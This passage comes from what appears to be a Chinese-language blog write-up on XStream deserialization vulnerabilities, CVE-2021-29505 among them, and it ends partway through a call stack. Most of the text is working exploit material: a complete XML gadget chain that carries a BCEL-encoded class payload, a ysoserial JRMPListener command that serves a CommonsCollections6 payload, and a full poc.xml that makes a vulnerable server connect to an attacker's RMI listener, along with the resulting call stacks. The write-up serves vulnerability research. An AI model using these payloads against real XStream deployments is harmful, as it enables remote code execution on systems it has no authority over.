class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$L$b3$ac$8b$bc$E$df$P$w$81B$g$3b$88$8d$c1F$U$pD$eba$9c$90$c5e$97$y$D$e1$8f$aci$d0X$f8$B$7e$94$f1$ee$c6$A$89S$dc$c7$b9$e7$9c$99$3b$df$3f$9f_$A$$Q$b6$60$oo$a1$80$j$T$c50$978v$z$q$b0$c7$b1$cfq$c0$90l$3a$9e$a3$af$Y$e2$95$ea$T$83q$ed$bf$u$86L$db$f1$d4$fdt$d4WAO$f4$5dB$cc$a6t$ff$98$e9$ae$W$f2$f5N$8c$a3$R$Z2X$5d$7f$gHu$e3$84$d4Tk$e6$b8$XC1$T6R$b08$Om$i$e1$98$cc$a5p$a5$8d$T$9c2$U$c2y$dd$V$de$a0$de$9aK5$d6$8e$ef$d98$83E$b4P$cf$90$5d3$3a$fd$a1$92$9a$n$b7$86$k$a7$9evFt$9b5Pz$d5$U$x$d5$f6$3fN$83$y$d5$5cI$86$f3$ca$c6$b4$ab$D$c7$h46$F$P$81$_$d5dB$82$cc$98$86$3aZ$b4$X$I$a9P$G$a7$bf$MO$M$y$5c$8b$e2$Wu$c7$94$Z$e5D$ed$jlA$F$83M1$Z$81$f4mH$af$a8$9dH$K$e4$3f$Q$cb$c7$970$9e$df$60$de$d6$96H$$$o$3cE$ca$EqB$7d$89$w$c0$m$8cGh$9a$is$e4$b6M$uG$ac$cd$911H$94$8d$de$93$fb$F$3c$qq$f9$f1$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">defineClass:635, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:351, ClassLoader (java.lang)</span><br><span class="line">hasNext:409, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:24, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h3><p><strong>Jasper 的叨叨念</strong>：这里官网使用的是 priorityQueue 作为入口，但是 baizhu 师傅在 tabby 分析利用链的时候使用的是 sorted-map，所以如果看的是他的文章，可能会出现很迷惑的地方，特此说明。</p><h4 id="影响范围-9"><a href="#影响范围-9" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.16</p><p>jdk &lt; 8u231，没有深究是 CC6 还是 XStream 的问题，总之 8u231 是复现失败， 8u221 以及之前可以复现成功。</p><h4 id="版本说明-9"><a href="#版本说明-9" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：已知 XStream 可以实现以 PriorityQueue 为入口的反序列化，于是让它和 yso JRMPClient 结合起来。ysoserial 的 JRMP 有两种攻击方式，其中一种是攻击者构建恶意 JRMPServer，并绑定一个 EvildObject；然后利用被攻击者存在的反序列化漏洞，去连接攻击者的 JRMPServer，并反序列化 EvildObject。显然，反序列化 EvildObject 需要被攻击方拥有 EvildObject 所需的对应依赖。（整个过程类似 RMI 的利用方式）</p><p>关于 yso JRMP 相关利用原理可以看参考链接。</p><p>首先，搭一个 JRMPListener ，上面绑定好要传给 Client 的 EvilObject。这里以 CC6 为例，被攻击方需要配置 CC依赖。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 &quot;calc&quot;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nullIter</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">environment</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>9999<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">host</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">port</span>&gt;</span>9999<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nullIter</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/465726e64817ec0d451c922c78185466.png"></p><p>下面的 <code>sun.rmi.transport.LiveRef#read</code> 是进行 RMI 连接的逻辑。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d0c59b597676dd5fba5aaede017f1c86.png"></p><p>函数调用栈，这里只给到建立 RMI 链接，后面实际上就是恶意 RMI Server  攻击 RMI Client 的逻辑，不细说。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">read:291, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:455, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller 